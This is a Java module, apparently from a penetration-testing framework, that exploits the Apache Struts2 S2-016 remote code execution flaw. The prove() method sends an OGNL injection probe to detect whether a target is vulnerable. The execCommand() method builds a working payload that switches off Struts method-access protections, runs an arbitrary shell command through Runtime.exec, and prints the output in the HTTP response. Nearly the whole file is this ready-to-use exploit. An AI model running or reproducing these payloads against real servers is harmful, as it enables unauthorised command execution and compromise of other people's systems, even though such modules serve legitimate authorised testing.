package com.orleven.tentacle.permeate.script;

import org.apache.catalina.util.URLEncoder;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;
import com.orleven.tentacle.core.IOC;
import com.orleven.tentacle.define.Message;
import com.orleven.tentacle.define.Permeate;
import com.orleven.tentacle.permeate.bean.ProveBean;
import com.orleven.tentacle.permeate.script.base.WebScriptBase;
import com.orleven.tentacle.util.WebUtil;

/**
 * Struts2 RCE 016
 * @author orleven
 * @date 2017年1月3日
 */
@Component
@Scope("prototype")
public class Struts2RCE016 extends WebScriptBase {
	
	
	public Struts2RCE016(){
		super();
	}
	
	@Override
	public void prove() {
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String provePayload = new URLEncoder().encode("redirect:${#w=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#w.print('The Struts2-016 Remote Code Execution Is Exist!'),#w.flush(),#w.close()}","UTF-8");
		String proveFlag1 = "The Struts2-016 Remote Code Execution Is Exist!";
		String proveFlag2 = "com.opensymphony.xwork2.dispatcher.HttpServletResponse";
		String result = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(), getHttpHeaders(),provePayload));
		if (result==null) {
			result = Message.notAvailable;
			getVulnerBean().setIsVulner(Permeate.isNotVerified);
		}else if(result.indexOf(proveFlag1)>=0&&result.indexOf(proveFlag2)<0){
			getVulnerBean().setIsVulner(Permeate.isVulner);
		}
		else{
			getVulnerBean().setIsVulner(Permeate.isNotVulner);
		}
		proveBean.setReceiveMessage(result);
		proveBean.setSendMessage(provePayload);
		getVulnerBean().getProveBean().add(proveBean);
		
	}

	@Override
	public void execCommand(String command) {
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String execPayload1 = "redirect:${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec('";
		String execPayload2 = "').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#genxor=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#genxor.println('----- The Struts2-016 Remote Code Execution -----'),#genxor.println(#d),#genxor.println('----- The Struts2-016 Remote Code Execution -----'),#genxor.flush(),#genxor.close()}";
		String execPayload = new URLEncoder().encode(execPayload1+ command +execPayload2,"UTF-8");
		String result = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(), getHttpHeaders(),execPayload));
		proveBean.setReceiveMessage(result);
		proveBean.setSendMessage(command);
		getVulnerBean().getProveBean().add(proveBean);
	}
	
}
